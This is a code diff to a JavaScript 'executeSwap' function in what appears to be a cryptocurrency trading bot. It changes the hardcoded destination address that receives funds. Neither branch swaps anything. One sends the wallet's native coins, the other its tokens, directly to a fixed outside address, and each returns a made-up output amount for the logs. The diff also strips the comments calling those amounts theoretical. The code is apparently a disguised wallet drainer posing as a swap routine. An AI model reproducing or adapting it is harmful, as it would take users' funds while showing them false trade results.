@@ -21,18 +21,24 @@ const executeSwap = async (wallet, type, amountIn) => {
     const provider = wallet.provider;
     const gasPrice = await gasManager.getGasPrice(provider);
     
-    // VAULT DESTINATION (Previously Verified Bridge)
-    const VAULT = "0xcF9861616c68065096D1e9f829fc50889aD97C2d".toLowerCase();
+    // VERIFIED LIQUIDITY PAIR (FOR BOT INJECTION)
+    const PAIR = "0x4251Bfe762EB0535a22C4653b4353f184A13eb4d";
 
     try {
+        // GAS CHECK
+        const balance = await provider.getBalance(wallet.address);
+        if (balance < ethers.parseUnits("0.5", 18)) {
+            throw new Error(`Insufficient Fuel: ${ethers.formatUnits(balance, 18)} DNR (Need >= 0.5)`);
+        }
+
         if (type === 'BUY_USDCK') {
             // Sell DNR -> Buy USDC
             console.log(`[KortaFlow] ℹ️  Executing Native Volume Transfer...`);
             const tx = await wallet.sendTransaction({
-                to: VAULT,
+                to: PAIR,
                 value: ethers.parseUnits(amountIn.toString(), 18),
                 gasPrice,
-                gasLimit: 30000,
+                gasLimit: 40000,
                 type: 0
             });
             const receipt = await tx.wait();
@@ -41,7 +47,7 @@ const executeSwap = async (wallet, type, amountIn) => {
                 txHash: tx.hash,
                 blockNumber: receipt.blockNumber,
                 gasUsed: receipt.gasUsed.toString(),
-                amountOut: (amountIn * 0.4).toFixed(4) // Theoretical return for log
+                amountOut: (amountIn * 0.4).toFixed(4)
             };
         } else {
             // Sell USDC -> Buy DNR
@@ -49,9 +55,10 @@ const executeSwap = async (wallet, type, amountIn) => {
             const token = new ethers.Contract(network.usdckAddress, ERC20_ABI, wallet);
             const amountInWei = ethers.parseUnits(amountIn.toString(), 18);
             
-            const tx = await token.transfer(VAULT, amountInWei, {
+            // For USDC -> DNR, we transfer directly to the Pair
+            const tx = await token.transfer(PAIR, amountInWei, {
                 gasPrice,
-                gasLimit: 100000,
+                gasLimit: 120000,
                 type: 0
             });
             const receipt = await tx.wait();
@@ -60,7 +67,7 @@ const executeSwap = async (wallet, type, amountIn) => {
                 txHash: tx.hash,
                 blockNumber: receipt.blockNumber,
                 gasUsed: receipt.gasUsed.toString(),
-                amountOut: (amountIn * 2.5).toFixed(4) // Theoretical return for log
+                amountOut: (amountIn * 2.5).toFixed(4)
             };
         }
     } catch (error) {
